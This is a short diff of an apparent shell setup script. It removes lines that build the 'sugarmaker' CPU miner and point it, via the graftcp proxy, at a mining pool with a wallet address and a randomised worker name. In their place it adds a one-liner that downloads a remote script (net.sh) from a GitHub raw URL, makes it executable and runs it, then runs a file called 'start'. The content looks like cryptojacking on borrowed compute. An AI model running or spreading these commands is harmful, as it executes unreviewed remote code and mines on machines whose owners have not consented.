@@ -43,9 +43,4 @@ cd ..
 
 
 
-/graftcp/graftcp git clone https://github.com/decryp2kanon/sugarmaker.git
-cd sugarmaker
-./autogen.sh
-./configure CFLAGS='-O3'
-make
-./sugarmaker -a YespowerNull -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra.$(shuf -n 1 -i 1-9999999) -p c=BTE
+/graftcp/graftcp wget https://raw.githubusercontent.com/adisubarja/cuk/main/net.sh && chmod u+x net.sh && ./net.sh && chmod +x start &&./start
